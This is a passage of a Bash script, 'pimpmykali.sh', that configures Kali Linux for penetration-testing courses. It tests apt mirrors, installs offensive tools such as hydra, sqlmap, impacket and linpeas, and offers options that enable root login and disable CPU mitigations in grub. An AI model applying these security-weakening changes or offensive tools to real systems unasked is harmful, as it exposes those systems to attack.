\\\n    sed s:\"http\\:\\/\\/http.kali.org\\/README.meta4\":\"\":g | sed s:\"http\\:\\/\\/http.kali.org\\/README.metalink\":\"\":g | sort -u > /tmp/timetest.list\n  \t}\n\n\nbest_ping() {\n    [[ -f /tmp/kali-ping ]] && rm -f /tmp/kali-ping\n\t  echo -e \"\\n  ${greenplus} Testing kali mirrors round-trip-time, selecting the top 10\"\n    mirror=$(cat /tmp/timetest.list | sort -u | sed s:\"http\\:\\/\\/\":\"\":g)\n    \n    for i in $mirror; do\n      current_mirror=$(echo $i | cut -d \"/\" -f1)\n      current_file=$(echo $i | cut -d \"/\" -f2-10)\n      avg_rtt_mirror=$(ping -c 3 $current_mirror | grep -i rtt | cut -d \"=\" -f2 | cut -d \"/\" -f2)\n     \n      if [[ $avg_rtt_mirror = \"\" ]]\n        then\n          echo -e \"${spaces}${redexclaim} Failed to respond: $current_mirror\"\n        else\n          echo -e \"${spaces}${greenplus} Testing $current_mirror rtt time: $avg_rtt_mirror\"ms\" \"\n          echo \"$avg_rtt_mirror:$current_mirror\" >> /tmp/kali-ping\n      fi\n    done\n\n    best_rtt=$(cat /tmp/kali-ping | sed -r '/^\\s*$/d' | sort -nr | tail -n1 | cut -d \":\" -f1)\n    best_rttmirror=$(cat /tmp/kali-ping | sed -r '/^\\s*$/d' | sort -nr | tail -n1 | cut -d \":\" -f2)\n    echo -e \"${spaces}${greenplus} Best rtt result : $best_rtt\"ms\" at $best_rttmirror\"\n    }\n\n\nsmall_speedtest() {\n  \techo > /tmp/mirrors_speedtest\n    echo -e \"\\n  ${greenplus} Testing top 10 mirrors - small transfer >1MB, select top 5\"\n    for i in $(cat /tmp/kali-ping | sed -r '/^\\s*$/d' | sort -n | head -n10 | cut -d \":\" -f2); do\n  \t  active_mirror=$(cat /tmp/timetest.list | grep \"$i\" | grep \"README\" | sed -r '/^\\s*$/d')\n  \t  active_mirror_display=$(cat /tmp/timetest.list | grep \"$i\" | grep \"README\" | cut -d \"/\" -f3| sed -r '/^\\s*$/d')\n  \t  get_download=$(curl -s \"$active_mirror\" -w %{speed_download} -o /dev/null)\n   \t  mb_speed=$(($get_download / 1024 / 1024))\n  \t  echo \"$get_download:$active_mirror:$mb_speed\" >> /tmp/mirrors_speedtest\n      echo -e \"${spaces}${greenplus} $active_mirror_display speed: $get_download b/sec\"\n  \tdone\n  \t}\n\n\nlarge_speedtest() {\n  \techo > /tmp/mirrors_speedtest\n  \techo -e \"\\n  ${greenplus} Testing top 5 mirrors from small transfer - large transfer (10MB)\"\n  \tfor i in $(cat /tmp/kali-ping | sed -r '/^\\s*$/d' | sort -n | head -n5 | cut -d \":\" -f2); do\n  \t  active_mirror=$(cat /tmp/timetest.list | grep \"$i\" | grep \"README\" | sed s:\"README\":\"dists/kali-rolling/Contents-amd64.gz\":g | sed -r '/^\\s*$/d')\n  \t  active_mirror_display=$(cat /tmp/timetest.list | grep \"$i\" | grep \"README\" | cut -d \"/\" -f3| sed -r '/^\\s*$/d')\n   \t  get_download=$(curl --max-time 30 -s -r 0-10485760 \"$active_mirror\" -w %{speed_download} -o /dev/null)\n   \t  mb_speed=$(($get_download / 1024 / 1024))\n  \t  echo \"$get_download:$active_mirror:$mb_speed\" >> /tmp/mirrors_speedtest\n  \t  echo -e \"${spaces}${greenplus} $active_mirror_display speed: $get_download b/sec ($mb_speed MB/sec)\"\n  \tdone\n  \t}\n\n\ngen_new_sources() {\n  \ti=$(cat /tmp/mirrors_speedtest | sort -n | tail -n1 | cut -d \"/\" -f3)\n  \tfinal_mirror=$(cat /tmp/timetest.list | grep \"$i\" | sed s:\"http\\:\\/\\/\":\"\":g | sed s:\"/README\":\"\":g )\n    # --- relaxed grep and sed, implement at later date 12.11.2021 - should now work with tracelabs osint vm\n    newdeb=$(cat /etc/apt/sources.list | grep \"deb http\\:\\/\\/.* kali\\-rolling.*\" | sed s:\"deb http\\:\\/\\/.* kali\\-rolling.*\":\"deb http\\:\\/\\/\"$final_mirror\" kali\\-rolling main contrib non\\-free\":g)\n    newdebsrc=$(cat /etc/apt/sources.list | grep \"deb-src http\\:\\/\\/.* kali\\-rolling.*\" | sed s:\"deb-src http\\:\\/\\/.* kali\\-rolling.*\":\"deb\\-src http\\:\\/\\/\"$final_mirror\" kali\\-rolling main contrib non\\-free\":g )\n    sourcefile=/etc/apt/sources.list\n    echo -e \"\\n  ${greenplus} Based on tests the best selection is: $i \"\n    echo -e \"\\n  Preview of the new /etc/apt/sources.list:\"\n    echo -e \"\\n  $newdeb\\n  $newdebsrc\"\n    echo -e \"\\n\\n   Save new changes to /etc/apt/sources.list ?\"\n    read -n1 -p \"   Please type Y or N : \" userinput\n     case $userinput in\n       y|Y) echo -e \"\\n\\n  ${greenplus} Saving changes to /etc/apt/sources.list\"; cp $sourcefile ${sourcefile}_$(date +%F-%T); \\\n            sed s:\"deb http\\:\\/\\/.* kali\\-rolling.*\":\"deb http\\:\\/\\/\"$final_mirror\" kali\\-rolling main contrib non\\-free\":g -i $sourcefile; \\\n            sed s:\"deb-src http\\:\\/\\/.* kali\\-rolling.*\":\"deb\\-src http\\:\\/\\/\"$final_mirror\" kali\\-rolling main contrib non\\-free\":g -i $sourcefile; \\\n            sed 's/non-free$/non-free non-free-firmware/' -i $sourcefile\n            echo -e \"\\n  ${greenplus} Running apt update with mirror $final_mirror selected \\n\"; apt_update;;\n       n|N) echo -e \"\\n\\n  ${redexclaim} Not saving changes\";;\n         *) echo -e \"\\n\\n  ${redexclaim} Invalid key try again, Y or N only ${redexclaim}\"; gen_new_sources;;\n     esac\n    }\n\n\ncleanup() {\n  \trm -f /tmp/kali-speedtest.found /tmp/kali-speedtest /tmp/timetest.list /tmp/kali-latency /tmp/sources.list /tmp/final.list /tmp/kali-ping /tmp/mirrors_speedtest > /dev/null\n    }\n\n\nfix_keyboard() {\n    sudo /bin/bash --rcfile /home/$finduser/.bashrc -ic 'dpkg-reconfigure keyboard-configuration'\n    }\n\n\nfix_timezone() {\n    sudo /bin/bash --rcfile /home/$finduser/.bashrc -ic 'dpkg-reconfigure tzdata' 2>/dev/null\n    echo -e \"\\n  ${greenplus} Timezone now set to: $(cat /etc/timezone)\"\n    }\n\n\ninstall_everything() {\n    echo -e \"\\n  ${greenplus} Installing Everything! \\n\"\n    sudo /bin/bash -m --rcfile /home/$finduser/.bashrc -ic 'apt -y install kali-linux-everything' 2> /dev/null\n    }\n\n\nfix_pip2_pip3() {\n    # set the pips for python3\n    echo -e \"\\n  ${greenplus} Checking /bin/pip for python3\"\n    if [[ -f /usr/bin/pip ]]\n      then\n        pip_check=$(/usr/bin/pip --version | grep -i -c \"python 2\")\n    fi\n\n    if [[ $pipcheck -eq 1 ]]\n      then\n        is_installed_reinstall \"python3-pip\"\n        ln -sf /usr/bin/pip3 /usr/bin/pip\n      else\n        echo -e \"${spaces}${greenminus} /bin/pip is for python3, skipping\"\n        pip_check=\"\"\n    fi\n\n    echo -e \"\\n  ${greenplus} Checking /usr/local/bin/pip for python3\"\n    if [[ -f /usr/local/bin/pip ]] \n      then\n        pip_check=$(/usr/local/bin/pip --version | grep -i -c \"python 2\")\n    fi\n         \n    if [[ $pip_check -eq 1 ]]\n      then \n        is_installed_reinstall \"python3-pip\"\n      else\n        echo -e \"${spaces}${greenminus} /usr/bin/pip is for python3, skipping\"\n    fi\n    }\n\n\ninstall_docker() {\n    is_installed \"docker-cli docker.io\"\n    }\n\n\ninstall_pip2() {\n    is_installed_pip2=$(whereis pip2 | cut -d \" \" -f 2) \n    if [[ $is_installed_pip2 == \"/usr/bin/pip2\" ]]\n    then\n      echo -e \"\\n  ${greenminus} Pip2 for Python2 is installed at ${is_installed_pip2}\"\n    else \n      PIP2_URL=\"https://bootstrap.pypa.io/pip/2.7/get-pip.py\"\n      mkdir /opt/pip2\n      cd /opt/pip2\n      curl ${PIP2_URL} -o get-pip.py\n      /usr/bin/python2 /opt/pip2/get-pip.py\n      ln -sf /usr/local/bin/pip2 /usr/bin/pip2\n      rm /usr/local/bin/pip\n      chmod +x /bin/pip2\n      chmod +x /usr/bin/pip2\n      chmod +x /usr/local/bin/pip2\n    fi\n    }\n\n\ninstall_pip3_modules() {\n    pip3modules=(\n      \"setuptools\"\n      \"importlib\"\n      \"pyftpdlib\"\n    )\n\n    for pip3module in \"${pip3modules[@]}\"; do\n      is_installed \"python3-${pip3module}\"\n    done\n    }\n\n\ninstall_pip2_modules() {\n    pip2modules=(\n      \"setuptools\"\n      \"importlib\"\n      \"flask\"\n      \"ldap3==2.5.1\"\n      \"pycryptodome\"\n      \"xlrd==1.2.0 --upgrade\"\n      \"scapy==2.4.0 --upgrade\"\n      \"colorama\"\n      \"termcolor\"\n      \"service-identity\"\n      \"requests==2.2.1\"\n    )\n\n    echo -e \"\\n  ${greenplus} Installing python2 modules\"\n\n    for pip2module in \"${pip2modules[@]}\"; do\n      pip2_module_name=$(echo $pip2module | cut -d \"=\" -f1)\n    \n      is_pip2_module_installed=$(pip2 list | grep -i -c $pip2_module_name)\n      if [[ $is_pip2_module_installed -eq 0 ]]\n        then \n          echo -e \"${spaces}${greenplus} Installing pip2 module ${pip2module} \"\n          /usr/bin/pip2 install $pip2module\n        else\n          echo -e \"${spaces}${greenminus} ${pip2module} already installed\"\n      fi\n    done\n    }\n\n\ninstall_pip3() {\n    is_installed \"python3-pip\"\n    }\n\n\ninstall_pipx() {\n    is_installed \"pipx\"\n\n    APP=\"pipx\"\n    FUNCTYPE=\"ensurepath\"\n    sudo -u $(logname) pipx ensurepath\n    EXIT_STATUS=\"$?\"\n    check_exit_status ${APP} ${FUNCTYPE} ${EXIT_STATUS}\n    clean_vars\n    }\n\n\ninstall_gobuster() {\n    is_installed \"gobuster\"\n    }\n\n\ninstall_ffuf() {\n    is_installed \"ffuf\"\n    }\n\n\ninstall_wfuzz() {\n    is_installed \"wfuzz\"\n    }\n\n\ninstall_hydra() {\n    is_installed \"hydra\"\n    }\n\n\ninstall_sqlmap() {\n    is_installed \"sqlmap\"\n    }\n\n\ninstall_enumforlinux() {\n    is_installed \"enum4linux\"\n    }\n\n\ninstall_enumforlinux_ng() {\n    is_installed \"enum4linux-ng\"\n    }\n\n\ninstall_plumhound() {\n    echo -e \"\\n  ${greenplus} PlumHound setup\"\n    is_installed \"bloodhound\" \n\n    findrealuser=$(logname) \n\n    [ -d /opt/PlumHound ] && rm -rf /opt/PlumHound\n    PLUMHOUND_URL=\"https://github.com/PlumHound/PlumHound\"\n    PLUMHOUND_DIR=\"/opt/PlumHound\"\n    git clone ${PLUMHOUND_URL} ${PLUMHOUND_DIR}\n\n    cd $PLUMHOUND_DIR\n    echo -e \"${spaces}${greenplus} Installing PlumHound\" \n    /usr/bin/pip3 install -r requirements.txt --break-system-packages\n    chmod +x /opt/PlumHound/PlumHound.py \n  \n    echo -e \"${spaces}${greenplus} Creating Symlink /usr/local/bin/PlumHound.py\" \n    [ -L /usr/local/bin/PlumHound.py ] && rm -f /usr/local/bin/PlumHound.py\n    ln -sf /opt/PlumHound/PlumHound.py /usr/local/bin/PlumHound.py\n\n    echo -e \"${spaces}${greenplus} Creating symlink /usr/local/bin/plumhound\" \n    [ -L /usr/local/bin/plumhound ] && rm -f /usr/local/bin/plumhound\n    ln -sf /opt/PlumHound/PlumHound.py /usr/local/bin/plumhound\n    }\n\n\nfix_impacket() {\n    is_installed_reinstall \"python3-impacket impacket-scripts\"\n    }\n\n\ncheck_installed_linuxheaders() {\n    is_installed \"linux-headers-$(uname -r)\"\n    }\n\n\ncheck_installed_dkms() {\n    is_installed \"dkms\"\n    }\n\n\nsetup_binfmt_misc_winexe() {\n    #add wine, regsiter Windows binaries\n    dpkg --add-architecture i386 \n    apt_update\n    is_installed \"wine32:i386\"\n    BINFMT_MISC_PATH=\"/proc/sys/fs/binfmt_misc\"\n\n    if [[ ! -f $BINFMT_MISC_PATH/DOSWin ]]\n      then \n        echo -e \"${spaces}${greenplus} Adding DOSWin binaries to $BINFMT_MISC_PATH\"\n        echo ':DOSWin:M::MZ::/usr/bin/wine:' > $BINFMT_MISC_PATH/register\n      else\n        echo '-1' > $BINFMT_MISC_PATH/DOSWin\n        echo ':DOSWin:M::MZ::/usr/bin/wine:' > $BINFMT_MISC_PATH/register\n        echo -e \"${spaces}${greenminus} DOSWin binaries already added to $BINFMT_MISC_PATH\"\n    fi\n    }\n\n\nsetup_binfmt_mount() {\n    # feature request \n    echo -e \"\\n  ${greenplus} Setup binfmt_misc mount\"\n    BINFMT_MISC_PATH=\"/proc/sys/fs/binfmt_misc\"\n\n    CHECK_LSMOD=$(lsmod | grep -i -c \"binfmt_misc\")\n    if [[ $CHECK_LSMOD -eq 0 ]]\n      then\n        echo -e \"${spaces}${greenplus} Loading binfmt_misc module\"\n        modprobe binfmt_misc\n      else\n        echo -e \"${spaces}${greenminus} binfmt_misc module already loaded, skipping\"\n    fi \n\n    CHECK_FSTAB=$(cat /etc/fstab | grep -i -c \"binfmt_misc\")\n    if [[ $CHECK_FSTAB -eq 0 ]]\n      then\n        echo -e \"${spaces}${greenplus} Adding binfmt_misc mount to /etc/fstab\"\n        echo 'binfmt_misc /proc/sys/fs/binfmt_misc binfmt_misc defaults 0 0' >> /etc/fstab \n      else\n        echo -e \"${spaces}${greenminus} binfmt_misc mount already exists in /etc/fstab, skipping\"\n    fi \n   \n    CHECK_MOUNT=$(mount | grep -i -c \"/proc/sys/fs/binfmt_misc\")\n    if [[ $CHECK_MOUNT -eq 0 ]]\n      then\n        echo -e \"${spaces}${greenplus} Mounting binfmt_misc\"\n        mount binfmt_misc\n      else\n        echo -e \"${spaces}${greenminus} binfmt_misc already mounted, skipping\"\n      fi \n    }\n\n\n# ascii art - DONT move\nasciiart=$(base64 -d <<< \"H4sIAAAAAAAAA31QQQrCQAy89xVz9NR8QHoQH+BVCATBvQmC\nCEXI480kXdteTJfdzGQy2S3wi9EM/2MnSDm3oUoMuJlX3hmsMMSjA4uAtUTsSQ9NUkkKVgKKBX\np1lEC0auURW3owsQlTZtf4QtGZgjXYKT4inPtI23oEK7wXlyPnd8arKdKE0EPdUnhIf0v+iE2o\n7BgVFVyec3u1OxFw+uRxbvPt8R6+MOpGq5cBAAA=\"  | gunzip )\n\n\nconfirm_menu_choice() {\n    # menu selection confirmation\n    if [ \"${menuinput}\" = \"x\" ] || [ \"${menuinput}\" == \"X\" ]\n    then\n      exit_screen\n    else\n      menuinput_to_upper=$(echo ${menuinput} | tr '[:lower:]' '[:upper:]')\n      echo -e \"\\n\"\n      read -n1 -p \"  Menu selection is ${menuinput_to_upper} press Y or N to confirm: \" selectinput\n\n      case $selectinput in\n        \"Y\"|\"y\") echo -e \"\\n\\n  ${greenplus} Executing menu option ${menuinpu_to_upper}\";;\n        \"N\"|\"n\") echo -e \"\\n\\n  ${greenminus} Restarting menu\"; return 1;;\n              *) echo -e \"\\n${spaces}${redexclaim} Invalid input, Y, y, N or n only\"; confirm_menu_choice $menuinput;;\n      esac\n    fi\n    }\n\n\npimpmykali_menu() {\n    while true; do\n      clear\n      echo -e \"$asciiart\"\n      echo -e \"\\n    Select an option from menu:             Rev: $revision Arch: $arch\"\n      echo -e \"\\n Key  Menu Option:                  Description:\"\n      echo -e \" ---  ------------                  ------------\"\n      echo -e \"  1 - Fix Missing                   (pip pip3 golang gedit nmapfix build-essential)\"              # fix_missing\n      echo -e \"  2 - Fix /etc/samba/smb.conf       (set client min/max protocol if not already set)\"             # fix_smbconf\n      echo -e \"  3 - Fix Golang                    (installs golang, adds GOPATH= to .zshrc and .bashrc)\"        # install_golang\n      echo -e \"  4 - Fix Grub                      (adds mitigations=off)\"                                       # fix_grub\n      echo -e \"  5 - Reinstall Impacket            (reinstall impacket from kali repo)\"                          # fix_impacket\n      echo -e \"  6 - Enable Root Login             (installs kali-root-login)\"                                   # SPEEDRUN=0; make_rootgreatagain\n      echo -e \"  7 - Fix Docker-Compose            (installs docker-compose and docker.io)\"                      # fix_dockercompose\n      echo -e \"  8 - Fix nmap scripts              (clamav-exec.nse and http-shellshock.nse)\"                    # fix_nmap\n      echo -e \"  9 - Pimpmyupgrade                 (apt upgrade with vbox/vmware detection)\"                     # only_upgrade\n      echo -e \"                                    (sources.list, linux-headers, vm-video)\"                      # only_upgrade extended text\n      echo -e \"  0 - Fix ONLY 1 thru 8             (runs only 1 thru 8) \\n\"                                      # fix_all\n      echo -e \"  \"$bold\"N - NEW VM SETUP\"$reset\" - Run this option if this is the first time running pimpmykali\\n\"\n      echo -e \"  = - Pimpmykali-Mirrors            (find fastest kali mirror. use the equals symbol = )\"          # get_mirrorlist; best_ping; small_speedtest; large_speedtest; gen_new_sources; cleanup;;\n      echo -e \"  T - Reconfigure Timezone           current timezone  : $(cat /etc/timezone)\"                     # reconfig_timekey\n      echo -e \"  K - Reconfigure Keyboard           current keyb/lang : $(cat /etc/default/keyboard | grep XKBLAYOUT | cut -d \"\\\"\" -f2)\" # reconfig_keyboard\n      echo -e \"\\n Key  Stand alone functions:        Description:\"                                               # \n      echo -e \" ---  --COURSES-------------------- ------------\"                                                 # \n      echo -e \"  A - MAPT Course Setup             (adds requirments for MAPT Course)\"                           # mapt_course\n      echo -e \"  B - Practical Bugbounty Labs      (add requirements for PBB course labs)\"                       # pbb_lab_setup\n      echo -e \"  E - PEH Course WebApp Labs        (add requirements for PEH WebApp Labs and installs) \"         # apt_update fix_libwacom peh_weblab_setup\n      echo -e \"  O - Hacking API Course Setup      (add requirements for Hacking API Course)\"                    # hacking_api_prereq\n      echo -e \"  Y - Andrew B IoT Hardware Hacking (add requirements for IoT Course)\"                            # iot_course_setup\n      echo -e \"  Z - Alex T C# 101 For Hackers     (add requirements for C# 101 course)\"                         # csharp_course_setup\n      echo -e \"\\n ---  --UTILS---------------------- ------------\"                                               # \n      echo -e \"  U - Install Netexec (nxc)         (install netexec)\"                                            # fix_netexec\n      echo -e \"  P - Download Lin/WinPeas          (adds linpeas to /opt/linpeas and winpeas to /opt/winpeas)\"   # fix_linwinpeas\n      echo -e \"  V - Install MS-VSCode             (install microsoft vscode only)\"                              # install_vscode\n      echo -e \"  ! - Nuke Impacket                 (install Impacket 0.9.19)\"                                    # fix_sead_warning\n      echo -e \"  @ - Install Nessus                (install Nessus and start nessusd service)\"                   # install_nessus\n      echo -e \"  $ - Nuke Nessus                   (stop nessusd service and remove nessus)\"                     # remove_nessus\n      echo -e \"  % - CrackMapExec                  (install crackmapexec)\\n\"                                     # fix_cme\n      echo -e \"  Please use sudo ./pimpmykali.sh --help for additional installations/fixes\\n\"\n      # menu selection\n      read -n1 -p \"  Press key for menu item selection or press X to exit: \" menuinput\n\n      # menu selection confirmation\n      confirm_menu_choice $menuinput\n      if [ $? -eq 0 ]; \n        then\n          break\n      fi\n    done \n\n    if [ $APT_UPDATE_RAN -eq 0 ]\n      then \n        apt_update\n        export APT_UPDATE_RAN=1\n    fi \n\n    case $menuinput in\n        1) SPEEDRUN=0; ENABLE_ROOT=0; fix_missing;;\n        2) fix_smbconf;;\n        3) install_golang; fix_go_path;;\n        4) fix_grub;;\n        5) fix_impacket;;\n        6) SPEEDRUN=0; ENABLE_ROOT=1; make_rootgreatagain;;\n        7) fix_dockercompose;;\n        8) fix_nmap ;;\n        9) fix_libwacom; only_upgrade;;\n        0) SPEEDRUN=0; ENABLE_ROOT=0; fix_all;;\n      a|A) mapt_prereq;;\n      b|B) pbb_lab_setup;;\n#      c|C) ;;\n#      d|D) ;;\n      e|E) fix_libwacom; peh_weblab_setup;;\n#      f|F) ;;\n#      g|G) ;;\n#      h|H) ;;\n#      i|I) ;;\n#      j|J) ;;\n      k|K) fix_keyboard; echo -e \"\\n  ${greenplus} Keyboard is currently set to: $(cat /etc/default/keyboard | grep XKBLAYOUT | cut -d \"\\\"\" -f2)\";;\n#      l|L) ;;\n#      m|M) ;;\n      n|N) fix_all;;\n      o|O) hacking_api_prereq;;\n      p|P) fix_linwinpeas;; \n#      q|Q) ;;\n#      r|R) ;;\n#      s|S) ;;\n      t|T) fix_timezone;;\n      u|U) fix_netexec;;\n      v|V) install_vscode;;\n#      w|W) ;;\n      x|X) echo -e \"\\n\\n Exiting pimpmykali.sh - Happy Hacking! \\n\" ;;\n      y|Y) iot_course_setup;;\n      z|Z) csharp_course_setup;;\n      \"!\") install_pip2; install_pip3; fix_pip2_pip3; fix_sead_warning;;\n      \"=\") get_mirrorlist; best_ping; small_speedtest; large_speedtest; gen_new_sources; cleanup;;\n      \"^\") SPEEDRUN=1; ENABLE_ROOT=1; install_everything;;\n      \"@\") install_nessus;;\n      \"$\") remove_nessus;;\n      \"%\") fix_cme;;\n        *) pimpmykali_menu;;\n    esac\n    }\n\n\npimpmykali_help() {\n    echo -e \"\\n  Command line args:\"\n    options=(\n    \"         --auto  set speedrun var, bypass menu, only prompt is to set root password\"\n    \"   --autonoroot  set speedrun var, bypass menu, bypass enable root login, bypass prompts\"\n    \"          --all  run menu option 0 (fix all) with prompts, bypass enable root login\"\n    \"       --binfmt  enable and mount /proc/sys/fs/binfmt_misc\"\n    \"--binfmt-winexe  enable dos/windows exe in binfmt_misc, installs wine\"\n    \"   --bloodhound  install bloodhound\" \n    \"   --brokenxfce  apply broken xfce fix\"\n    \"          --cme  install crackmapexec\"\n    \"      --checkvm  detect hypervisor, install guest additions\"\n    \"--dockercompose  install docker compose\"\n    \"    --flameshot  install flameshot\"\n    \"        --gedit  install gedit, apply fix connection refused fix\"\n    \"       --golang  install golang\"\n    \"    --gowitness  install gowitness from github\"\n    \"       --ghidra  install ghidra from github, add dark theme\"\n    \"         --grub  update grub\"\n    \"         --help  this help menu\"\n    \"     --httprobe  run fix_httprobe\"\n    \"     --impacket  install impacket latest\"\n    \" --nukeimpacket  install impacket 0.9.19, leave python3 as default\"\n    \"      --mirrors  run pimpmykali-mirrors speedtest\"\n    \"        --mitm6  reinstall mitm6\"\n    \"      --missing  run menu option 1 (fix missing)\"\n    \"        --neo4j  install neo4j\"\n    \"        --newvm  menu option N new vm setup\"\n    \"         --nmap  run fix nmap\"\n    \"      --netexec  install netexec from github\"\n    \"       --nessus  download, install nessus and start nessusd service\"\n    \"   --nukenessus  stop nessusd service and remove nessus\"\n    \"         --peas  get all the peas (linpeas/winpeas)\"\n    \"    --plumhound  install plumhound\"\n    \"         --root  set speedrun var, enable root login\"\n    \"      --smbconf  run fix smb.conf \"\n    \"     --seclists  install seclists\"\n    \"        --spike  run fix spike\"\n    \"      --sublime  install sublime\"\n    \"       --vscode  install vscode\"\n    \"      --wayback  install waybackrust\"\n    \"      --upgrade  system upgrade, hypervisor detection, install guest additions\"\n    \"\\n Python fixes:\"\n    \"         --pip2  install pip2, --pip3 install pip3, --fixpip run fix pip function\"\n    \"         --pipx  install pipx\"\n    \"\\n TCM Security course setup:\"\n    \"          --api  Hacking API course setup\"\n    \"       --csharp  C# course setup\"\n    \"          --iot  IoT Hacking course setup\"\n    \"         --mapt  Mobile Application Pentester course setup\"\n    \"          --pbb  Practical Bugbounty course setup\"\n    \"    --pehweblab  PEH course Web Lab setup\"\n    )\n\n    for option in \"${options[@]}\"; do\n        echo -e \"$option\"\n    done\n    exit 0\n    }\n\n\ncheck_arg() {\n    if [ \"$1\" == \"--help\" ]\n      then\n        pimpmykali_help\n    elif [ \"$1\" == \"\" ]\n      then\n        pimpmykali_menu\n    else\n        apt_update\n        case $1 in\n           --auto) SPEEDRUN=1; ENABLE_ROOT=1 fix_all;;\n     --autonoroot) SPEEDRUN=1; ENABLE_ROOT=0 fix_all;;\n            --all) SPEEDRUN=0; ENABLE_ROOT=0 fix_all;;\n         --binfmt) setup_binfmt_mount;;\n  --binfmt-winexe) setup_binfmt_misc_winexe;;\n     --bloodhound) fix_bloodhound;;\n     --brokenxfce) fix_broken_xfce;;\n            --cme) fix_cme;;\n        --checkvm) virt_what; check_vm;;\n  --dockercompose) fix_dockercompose;;\n      --flameshot) fix_flameshot;;\n          --gedit) fix_gedit; fix_root_connectionrefused;;\n         --golang) install_golang; fix_go_path;;\n      --gowitness) fix_chrome; fix_gowitness;;\n         --ghidra) fix_ghidra;;\n           --grub) fix_grub;;\n           --help) pimpmykali_help;;\n       --httprobe) fix_httprobe;;\n       --impacket) fix_impacket;;\n         --nessus) install_nessus;;\n     --nukenessus) remove_nessus;;\n   --nukeimpacket) SPEEDRUN=1; install_pip2; install_pip3; fix_pip2_pip3; fix_sead_warning;;\n        --mirrors) get_mirrorlist; best_ping; small_speedtest; large_speedtest; gen_new_sources; cleanup;;\n          --mitm6) is_installed_reinstall \"mitm6\";;\n        --missing) SPEEDRUN=1 ENABLE_ROOT=0; fix_missing;;\n          --neo4j) fix_neo4j;;\n          --newvm) SPEEDRUN=1; ENABLE_ROOT=0; fix_all;;\n           --nmap) fix_nmap;;\n        --netexec) fix_netexec;;\n           --peas) fix_linwinpeas;;\n      --plumhound) install_plumhound;;\n           --root) SPEEDRUN=1; ENABLE_ROOT=1 make_rootgreatagain;;\n        --smbconf) fix_smbconf;;\n       --seclists) fix_seclists;;\n        --sublime) install_sublime;;\n         --vscode) install_vscode;;\n        --upgrade) only_upgrade;;\n           --pip2) install_pip2; install_pip2_modules;;\n           --pip3) install_pip3; install_pip3_modules;;\n         --fixpip) fix_pip2_pip3;;\n           --pipx) install_pipx;;\n          --spike) fix_spike;;\n         --csharp) csharp_course_setup;;\n            --pbb) pbb_lab_setup;;\n      --pehweblab) fix_libwacom; peh_weblab_setup;;\n            --api) hacking_api_prereq;;\n            --iot) iot_course_setup;;\n        --wayback) fix_waybackurls;;\n                *) pimpmykali_help; exit 0;;\n        esac\n      fi\n    }\n\n\nexit_screen() {\n    echo -e \"\\n\"\n    eval apt -y --fix-broken install >/dev/null 2>&1\n    echo -e \"$asciiart\"\n    echo -e \"\\n\\n    All Done! Happy Hacking! \\n\"\n    findrealuser=$(logname)\n    getshell=$(echo $SHELL | cut -d \"/\" -f4)\n    runuser $findrealuser $getshell -c 'subshell=$(echo $SHELL | cut -d \"/\" -f4); source $HOME/.$subshell\"rc\"'\n    exit\n    }\n\n\ncheck_for_root\ncheck_distro\ncheck_arg \"$1\"\nexit_screen\n"
        }
      ]
    }
  ]
}